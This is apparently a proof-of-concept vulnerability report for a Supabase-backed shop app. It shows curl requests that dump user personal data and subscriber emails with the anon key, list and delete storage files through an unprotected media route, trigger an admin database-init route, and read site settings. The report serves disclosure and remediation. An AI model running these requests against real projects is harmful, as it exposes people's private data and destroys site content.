# Proof of Concept (POC) - Data Leak Report

This document demonstrates how an unauthorized user can access or manipulate sensitive data in the project.

## 1. User PII Leak (Profiles Table)
The `profiles` table has a "Public" policy, meaning anyone with the Supabase Anon Key can download all user data (Names, Phone Numbers, Addresses).

**POC Command:**
```bash
# Replace with your actual project URL and Anon Key (found in browser console)
curl -X GET "https://[YOUR_PROJECT_ID].supabase.co/rest/v1/profiles?select=*" \
     -H "apikey: [SUPABASE_ANON_KEY]" \
     -H "Authorization: Bearer [SUPABASE_ANON_KEY]"
```
**Result:** Returns a JSON array of all registered users with their phone numbers and addresses.

---

## 2. Unauthorized Media Access & Deletion (/api/media)
The `/api/media` route is completely unprotected and uses the **Service Role Key** internally.

- **List All Files:** Anyone can see every file in your `products`, `categories`, and `banners` buckets.
  ```bash
  curl -X GET "https://[YOUR_DOMAIN]/api/media"
  ```
- **Delete Any File:** Anyone can delete your product images or banners.
  ```bash
  curl -X DELETE "https://[YOUR_DOMAIN]/api/media?bucket=products&file=expensive_product.jpg"
  ```

---

## 3. Critical System Exploit (/api/init-db)
This route is a "backdoor" that runs database migrations using the **Admin Client**.
```bash
curl -X GET "https://[YOUR_DOMAIN]/api/init-db"
```
**Danger:** It exposes the existence of a custom `exec_sql` function. If an attacker finds a way to pass their own query to an RPC, they could gain full control of your database. Even without that, they can trigger table alterations which might crash your site.

---

## 4. Site Settings Leak (/api/settings)
Anyone can see all site configurations, including internal business logic or contact details stored in the settings table.

**POC Command:**
```bash
curl -X GET "https://[YOUR_DOMAIN]/api/settings"
```
**Result:** Returns all global settings.

---

## 5. Potential Email Leak (Subscribers)
If RLS is not enabled on the `subscribers` table (as seen in `full_schema.sql`), their emails can be dumped.

**POC Command:**
```bash
curl -X GET "https://[YOUR_PROJECT_ID].supabase.co/rest/v1/subscribers?select=email" \
     -H "apikey: [SUPABASE_ANON_KEY]" \
     -H "Authorization: Bearer [SUPABASE_ANON_KEY]"
```
